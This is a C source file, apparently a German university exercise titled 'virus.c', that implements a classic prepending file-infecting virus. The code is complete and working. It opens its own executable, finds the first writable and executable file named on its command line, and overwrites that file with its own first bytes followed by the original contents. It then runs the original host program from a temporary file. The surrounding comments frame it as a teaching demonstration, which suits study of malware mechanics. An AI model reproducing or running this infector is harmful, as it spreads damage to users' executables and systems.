/*
Aufgabe 2: virus.c

Das nächste Programm ist eines der ältesten Viren-Programme 
in der Geschichte der Informatik.
Ursprünglich als Demonstrations-Programm für akademische Diskussionen 
gedacht, beinhaltet es alle Merkmale, die man noch heute in 
moderneren Viren antrifft.
*/

#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>

/* the size of our own executable: please configure */
//static int V_OFFSET = 14056;
static int V_OFFSET = 8127;

extern int errno;
void do_infect(int, char **, int);

int
main(int argc, char **argv, char **envp){
	int len;
	int rval;
	int pid, status;
	int fd_r, fd_w;
	char *tmp;
	char buf[BUFSIZ];

	/*
	* sometimes it may be possible to modify argv[0], for example by
	* using zsh’s ARGV0 variable:
	*
	* zsh# ARGV0=foobar ls
	*
	* In that case this virus misbehaves!
	*/
//
	if ((fd_r = open(argv[0], O_RDONLY)) < 0)
		goto XBAILOUT;
//
	if (lseek(fd_r, V_OFFSET, SEEK_SET) < 0) {
		close(fd_r);
		goto XBAILOUT;
	}
//
	if ((tmp = tmpnam(NULL)) == NULL) {
		close(fd_r);
		goto BAILOUT;
	}
//cp
	if ((fd_w = open(tmp, O_CREAT | O_TRUNC | O_RDWR, 00700)) < 0)
		goto BAILOUT;
	
	while ((len = read(fd_r, buf, BUFSIZ)) > 0)
		write(fd_w, buf, len);

	close(fd_w);

	/* Infect */
	do_infect(argc, argv, fd_r);

	close(fd_r);

	if ((pid = fork()) < 0)
		goto BAILOUT;

	/* run the original executable */
	if (pid == 0) {
		execve(tmp, argv, envp);
		exit(127);
	}

	do {
		/* wait till you can cleanup */
		if (waitpid(pid, &status, 0) == -1) {
			if (errno != EINTR) {
				rval = -1;
				goto BAILOUT;
			} else {
				rval = status;
				goto BAILOUT;
			}
		}
	} while (1);

BAILOUT:
	unlink(tmp);

XBAILOUT:
	exit(rval);
}


void do_infect(int argc, char **argv, int fd_r) {
	int fd_t;
	int target, i;
	int done, bytes, length;
	void *map;
	struct stat stat;
	char buf[BUFSIZ];

	if (argc < 2)
		return;

	/* nail the first executable on the command line */
	for (target = 1; target < argc; target++)
		if (!access(argv[target], W_OK | X_OK))   //schreib und exe-bar, wenn ret==0
			goto NAILED;
	return;

NAILED:
	if ((fd_t = open(argv[target], O_RDWR)) < 0)
		return;
	fstat(fd_t, &stat);
	length = stat.st_size;
	map = (char *)malloc(length);
	if (!map)
		goto OUT;

	/* assume no short reads or writes, nor any failed lseeks */
	for (i = 0; i < length; i++)
		read(fd_t, map + i, 1);

	lseek(fd_t, 0, SEEK_SET);

	if (ftruncate(fd_t, 0)) // lösche, wenn ok ret==0
		goto OUT;

//cp argv[0], ins argv[1]
	done = 0;
	lseek(fd_r, 0, SEEK_SET);
	while (done < V_OFFSET) {
		bytes = read(fd_r, buf, 1);
		write(fd_t, buf, bytes);
		done += bytes;
	}
//append argvcp ins argv[1]
	for (bytes = 0; bytes < length; bytes++)
		write(fd_t, map + bytes, 1);

	free(map);

OUT:
	close(fd_t);
	return;
}
